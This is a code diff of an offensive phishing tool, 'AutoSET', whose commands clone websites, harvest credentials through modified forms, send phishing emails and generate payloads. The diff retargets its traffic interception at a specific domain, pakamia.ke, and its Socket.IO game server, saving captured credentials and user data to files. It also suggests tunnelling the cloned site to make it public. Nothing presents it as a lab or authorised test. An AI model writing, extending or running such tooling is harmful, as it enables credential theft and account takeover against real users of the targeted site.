@@ -71,7 +71,7 @@ def main():
     print("AutoSET Commands:")
     print("="*60)
     print("/harvest <url>              - Clone site and start harvester")
-    print("                              (Auto-detects WebSocket for pakamia.ke)")
+    print("                              (Auto-detects Socket.IO for pakamia.ke)")
     print("/phish <email> <pretext>    - Generate and send phishing email")
     print("/payload <type> <lhost>     - Generate payload")
     print("/list-payloads <platform>   - List available payloads")
@@ -130,11 +130,11 @@ def main():
                         # Start integrated harvester (serves site + captures creds + WebSocket)
                         print(f"🚀 Starting integrated harvester on port 8080...")
                         
-                        # Detect if site uses WebSocket (check for pakamia.ke)
+                        # Detect if site uses WebSocket/Socket.IO
                         ws_url = None
                         if 'pakamia.ke' in url:
-                            ws_url = 'wss://pakamia.ke/ws'
-                            print(f"🔌 WebSocket interception enabled for {ws_url}")
+                            ws_url = 'wss://gameserver.pakamia.ke/socket.io/'
+                            print(f"🎮 Socket.IO interception enabled for {ws_url}")
                         
                         harvester = start_integrated_harvester(
                             site_dir=str(site_dir),
@@ -149,9 +149,9 @@ def main():
                         print(f"✅ Cloned site being served with all assets")
                         print(f"✅ Forms automatically modified to capture credentials")
                         if ws_url:
-                            print(f"✅ WebSocket traffic being intercepted and logged")
-                            print(f"📊 WebSocket capture: {workspace / 'websocket_capture.json'}")
-                            print(f"🎯 Sessions will be saved to: {workspace / 'captured_sessions.json'}")
+                            print(f"✅ Socket.IO traffic being intercepted and logged")
+                            print(f"📊 Socket.IO capture: {workspace / 'socketio_capture.json'}")
+                            print(f"🎯 User data will be saved to: {workspace / 'captured_user_data.json'}")
                         print(f"📊 Captured credentials: {workspace / 'harvested_creds.json'}")
                         print(f"\n💡 Open http://localhost:8080 in your browser")
                         print(f"💡 Use /tunnel 8080 to make it publicly accessible")
